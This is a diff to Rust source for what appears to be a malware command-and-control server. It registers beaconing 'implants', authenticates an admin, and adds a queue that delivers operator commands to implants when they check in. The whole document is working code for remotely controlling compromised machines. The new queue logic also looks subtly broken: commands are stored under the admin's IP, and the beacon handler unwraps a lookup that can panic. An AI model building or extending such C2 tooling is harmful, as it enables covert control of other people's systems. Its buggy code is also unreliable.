@@ -14,12 +14,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let listener = TcpListener::bind("0.0.0.0:9120")?;
     let implants = Arc::new(Mutex::new(HashMap::new()));
     let admin_ip = Arc::new(Mutex::new(None));
+    let command_queue = Arc::new(Mutex::new(HashMap::<IpAddr, Vec<String>>::new()));
 
     for stream in listener.incoming() {
         let mut stream = stream.unwrap();
 
         let implants = Arc::clone(&implants);
         let admin_ip = Arc::clone(&admin_ip);
+        let command_queue = Arc::clone(&command_queue);
 
         thread::spawn(move || {
             let ip = stream.peer_addr().unwrap().ip();
@@ -29,14 +31,23 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             stream.read(&mut buf).expect("failed to read from stream");
 
             let decoded = decode(&buf).unwrap();
-            println!("{decoded:?}");
 
             match decoded {
                 Packet::Beacon { system_info } => {
                     implants
                         .lock()
                         .unwrap()
-                        .insert(stream.peer_addr().unwrap().ip(), Implant::new(system_info));
+                        .insert(ip, Implant::new(system_info));
+
+                    stream
+                        .write(
+                            encode(Packet::CommandList {
+                                commands: command_queue.lock().unwrap().get(&ip).unwrap().clone(),
+                            })
+                            .unwrap()
+                            .as_slice(),
+                        )
+                        .unwrap();
                 }
                 Packet::DashboardLogin { password } => {
                     let passwd = match env::var_os("TYSE_PASSWORD") {
@@ -62,8 +73,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                     if let Some(admin_ip) = *admin_ip.lock().unwrap()
                         && stream.peer_addr().unwrap().ip() == admin_ip
                     {
-                        run_admin_command(&mut stream, &decoded, &mut implants.lock().unwrap())
-                            .unwrap();
+                        let mut commands = command_queue.lock().unwrap();
+                        if !commands.contains_key(&ip) {
+                            commands.insert(ip, Vec::new());
+                        }
+
+                        run_admin_command(
+                            &mut stream,
+                            &decoded,
+                            &mut implants.lock().unwrap(),
+                            &mut commands.get_mut(&ip).unwrap(),
+                        )
+                        .unwrap();
                     } else {
                         println!(
                             "Unauthorized device tried to access admin commands: {}",
@@ -82,9 +103,11 @@ fn run_admin_command(
     stream: &mut TcpStream,
     packet: &Packet,
     implants: &mut HashMap<IpAddr, Implant>,
+    command_queue: &mut Vec<String>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     match packet {
         Packet::ImplantListRequest => {
+            println!("The admin requested the implant list");
             remove_old_implants(implants);
 
             stream.write(
@@ -99,16 +122,8 @@ fn run_admin_command(
             implant_id,
             command,
         } => {
-            if let Some(ip) = implants.keys().nth(*implant_id) {
-                connect_to_ip(ip)
-                    .write(
-                        encode(Packet::ImplantCommandPacket {
-                            command: command.clone(),
-                        })
-                        .unwrap()
-                        .as_slice(),
-                    )
-                    .unwrap();
+            if let Some(_ip) = implants.keys().nth(*implant_id) {
+                command_queue.push(command.clone());
             }
         }
         _ => {
@@ -132,8 +147,4 @@ fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAdd
         })
         .map(|(ip, implant)| (*ip, implant.clone()))
         .collect()
-}
-
-fn connect_to_ip(ip: &IpAddr) -> TcpStream {
-    TcpStream::connect(ip.to_string()).unwrap()
 }
